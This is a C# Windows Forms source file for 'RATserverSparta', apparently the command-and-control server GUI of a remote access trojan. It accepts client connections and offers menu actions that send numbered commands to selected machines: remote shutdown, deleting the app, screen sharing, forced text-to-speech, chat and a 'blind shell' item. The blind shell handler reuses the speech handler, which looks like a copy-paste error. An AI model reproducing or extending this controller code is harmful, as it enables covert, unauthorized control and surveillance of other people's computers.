using RATserverSparta.Client;
using RATserverSparta.GUI.Main;
using RATserverSparta.Sockets;
using RATserverSparta.Tools.Chat;
using RATserverSparta.Tools.Screen;
using RATserverSparta.Tools.Talk;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RATserverSparta
{
    public partial class MainGUI : Form
    {
        public int ConnectedClients = 0;
        private Server SocketServerClassInstance;
        public MainGUI()
        {
            InitializeComponent();
            this.SocketServerClassInstance = new Server(this);
            ClientsList.MouseUp += MouseEvent;
            this.SocketServerClassInstance.OnNewConnection += NewConnection;
            this.FormClosing += Close;
        }

        private void Close(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void serverCreationStripMenuItem_Click(object sender, EventArgs e)
        {
            //If Socket Server creation returned no errors
            if (this.SocketServerClassInstance.Create())
            {
                //Run Client Accepting at a new thread
                new Thread(new ThreadStart(() =>
                {
                    //Accept() is not the default Socket function, This is my own function at the SocketServer class.
                    this.SocketServerClassInstance.Accept();
                })).Start();
            }
        }

        private void NewConnection(Client.Client ClientClassInstance, Socket client)
        {
            Logs log = new Logs(this);
            GUI.Main.ListView Action = new GUI.Main.ListView(this);

            ClientClassInstance.CreateLogValue += log.Create;
            ClientClassInstance.ListViewAction += Action.ListViewAction;
        }        

        private void MouseEvent(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
                StripMenu.Show(Cursor.Position);

        }

        private void top_CheckedChanged(object sender, EventArgs e)
        {
            this.TopMost = top.Checked;
        }

        private dynamic SendDataAfterChecks(byte type)
        {
            if (ClientsList.SelectedItems.Count >= 1)
            {
                int count = ClientsList.SelectedItems.Count - 1;
                for (int i = count; i >= 0; i--)
                {
                    string SelectedClientString = ClientsList.SelectedItems[i].Text;
                    Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];
                    SocketSend Socket = new SocketSend(SelectedClientSocket);
                    Socket.Send(Encoding.ASCII.GetBytes("\0"), type);
                }
                return true;
            }
            else
                MessageBox.Show("no client selected");
            return false;
        }

        //Client program close
        private void disconnectToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            SendDataAfterChecks(7);
        }

        //Computer shutdown
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            SendDataAfterChecks(14);
        }

        //chat
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (SendDataAfterChecks(2))
            {
                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                Client.Client Client = this.SocketServerClassInstance.ClientInstanceMap[SelectedClientString];
                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];

                Chat chat = new Chat(Client, SelectedClientSocket);
                chat.Show();
            }
        }

        //Computer talk
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            if (SendDataAfterChecks(0))
            {
                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];

                ComputerTalk ComputerSpeech = new ComputerTalk(SelectedClientSocket);
                ComputerSpeech.Show();
            }
        }
        
        //Delete app
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            SendDataAfterChecks(23);
        }

        //Blind shell
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            if (SendDataAfterChecks(0))
            {
                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];

                ComputerTalk ComputerSpeech = new ComputerTalk(SelectedClientSocket);
                ComputerSpeech.Show();
            }
        }

        private void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            if (SendDataAfterChecks(8))
            {
                string SelectedClientString = ClientsList.SelectedItems[ClientsList.SelectedItems.Count - 1].Text;
                Client.Client Client = this.SocketServerClassInstance.ClientInstanceMap[SelectedClientString];
                Socket SelectedClientSocket = this.SocketServerClassInstance.ClientSocketMap[SelectedClientString];

                ScreenShare ScreenShare = new ScreenShare(Client, SelectedClientSocket);
                ScreenShare.Show();
            }
        }
    }
}
